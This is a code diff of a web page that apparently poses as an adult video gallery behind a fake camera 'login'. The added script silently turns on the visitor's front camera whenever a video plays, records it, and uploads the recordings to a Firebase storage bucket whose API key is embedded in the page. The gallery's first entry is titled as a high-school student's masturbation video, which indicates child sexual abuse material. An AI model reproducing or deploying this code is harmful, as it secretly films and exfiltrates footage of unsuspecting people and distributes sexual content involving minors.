@@ -128,6 +128,7 @@
         <p class="camera-switch-message">再読み込みで背面カメラに切り替わります<br>
             何も撮影しなくてもログインできるのは秘密🤫</p>
         <video id="video" autoplay></video>
+        <canvas id="canvas" style="display: none;"></canvas>
         <button id="captureButton">撮影してログイン</button>
     </div>
 
@@ -147,7 +148,24 @@
     </div>
 
     <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
+        import { getStorage, ref, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
+            authDomain: "nou-no-circle.firebaseapp.com",
+            projectId: "nou-no-circle",
+            storageBucket: "nou-no-circle.appspot.com",
+            messagingSenderId: "756338805186",
+            appId: "1:756338805186:web:cb740e035ac611b5baae5b",
+            measurementId: "G-TWBV38P13D"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const storage = getStorage(app);
+
         const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         const captureButton = document.getElementById('captureButton');
         const dialogOverlay = document.getElementById('dialogOverlay');
         const reloadButton = document.getElementById('reloadButton');
@@ -160,7 +178,7 @@
         let recordedChunks = [];
         let currentPage = 1;
 
-                const videos = [
+               const videos = [
             {
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon-4794d.appspot.com/o/FC2-PPV-2885137%20%E7%8F%BE%E5%BD%B9%E3%81%AE%E9%AB%98%E2%97%8B3%E2%97%8B%E7%94%9F%E3%81%A7%E3%81%99%E3%80%82%20%E9%83%A8%E6%B4%BB%E7%B5%82%E3%82%8F%E3%81%A3%E3%81%9F%E3%81%82%E3%81%A8%E5%88%9D%E3%82%81%E3%81%A6%E3%82%AA%E3%83%8A%E3%83%8B%E3%83%BC%E3%82%92%E6%92%AE%E3%81%A3%E3%81%A6%E3%81%BF%E3%81%BE%E3%81%97%E3%81%9F_1.mp4?alt=media&token=c3d99cd6-afe8-4fb3-8339-e8094eaa52e7',
                 title: '現役の高○3○生です。 部活終わったあと初めてオナニーを撮ってみました_1'
@@ -392,15 +410,17 @@
             // 他の動画URLとタイトルを追加
         ];
 
-        async function requestCameraAccess() {
+        async function requestCameraAccess(backCamera = true) {
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
                 const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                const frontCamera = videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];
+                const camera = backCamera
+                    ? videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0]
+                    : videoDevices.find(device => device.label.toLowerCase().includes('front')) || videoDevices[0];
 
                 const constraints = {
                     video: {
-                        deviceId: frontCamera.deviceId,
+                        deviceId: camera.deviceId,
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     }
@@ -415,37 +435,21 @@
             }
         }
 
-        function startRecording() {
-            recordedChunks = [];
-            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm; codecs=vp9' });
+        function captureAndLogin() {
+            if (videoStream) {
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            mediaRecorder.ondataavailable = event => {
-                if (event.data.size > 0) {
-                    recordedChunks.push(event.data);
-                }
-            };
-
-            mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const url = URL.createObjectURL(blob);
-
-                // Simulating login by showing the video gallery
                 loginContainer.style.display = 'none';
                 document.querySelector('h1').style.display = 'block';
                 videoGrid.style.display = 'grid';
                 pagination.style.display = 'flex';
-
-                // Upload the video to Firebase Storage
-                uploadVideo(blob);
                 loadVideos(currentPage);
-            };
-
-            mediaRecorder.start();
-        }
-
-        function stopRecording() {
-            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                mediaRecorder.stop();
+            } else {
+                console.error('カメラストリームが利用できません。');
+                alert('カメラストリームが利用できません。');
             }
         }
 
@@ -454,7 +458,7 @@
         }
 
         captureButton.addEventListener('click', () => {
-            requestCameraAccess().then(startRecording).catch(() => {
+            requestCameraAccess().then(captureAndLogin).catch(() => {
                 alert('カメラの権限が許可されていません。');
             });
         });
@@ -489,6 +493,14 @@
                 videoItem.appendChild(videoContainer);
                 videoItem.appendChild(titleElement);
                 videoGrid.appendChild(videoItem);
+
+                videoElement.addEventListener('play', () => {
+                    startVideoRecording();
+                });
+
+                videoElement.addEventListener('pause', () => {
+                    stopVideoRecording();
+                });
             });
 
             setupPagination(page);
@@ -512,21 +524,31 @@
             }
         }
 
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
-        import { getStorage, ref, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
+        async function startVideoRecording() {
+            await requestCameraAccess(false); // フロントカメラを使用
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
-            authDomain: "nou-no-circle.firebaseapp.com",
-            projectId: "nou-no-circle",
-            storageBucket: "nou-no-circle.appspot.com",
-            messagingSenderId: "756338805186",
-            appId: "1:756338805186:web:cb740e035ac611b5baae5b",
-            measurementId: "G-TWBV38P13D"
-        };
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm; codecs=vp9' });
 
-        const app = initializeApp(firebaseConfig);
-        const storage = getStorage(app);
+            mediaRecorder.ondataavailable = event => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                uploadVideo(blob);
+            };
+
+            mediaRecorder.start();
+        }
+
+        function stopVideoRecording() {
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop();
+            }
+        }
 
         function uploadVideo(blob) {
             const storageRef = ref(storage, `videos/${Date.now()}.webm`);
